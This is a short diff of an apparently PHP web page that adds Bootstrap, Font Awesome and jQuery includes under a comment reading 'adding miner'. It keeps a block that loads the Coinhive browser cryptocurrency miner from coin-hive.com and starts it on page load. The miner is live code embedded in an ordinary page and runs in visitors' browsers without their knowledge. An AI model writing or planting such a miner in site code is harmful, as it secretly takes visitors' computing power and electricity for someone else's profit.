@@ -6,6 +6,21 @@
  * Time: 17:49
  */
 
+
+/* include Bottstrap,Font awsome,Jquery */
+print ("
+ <link rel='stylesheet' href='need\bootstrap-4.0.0-beta\css\bootstrap.css'>
+ <link rel='stylesheet' href='need\font-awsome-4.7.0\css\font-awsome.min.css'>
+ <script src='need/jquery-2.1.4.min.js'></script>
+ 
+ 
+");
+
+
+
+
+
+/* adding miner*/
     print("
     <script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
     <script>
@@ -17,6 +32,7 @@
          miner.start();
      </script>
     ");
+
 
 
 
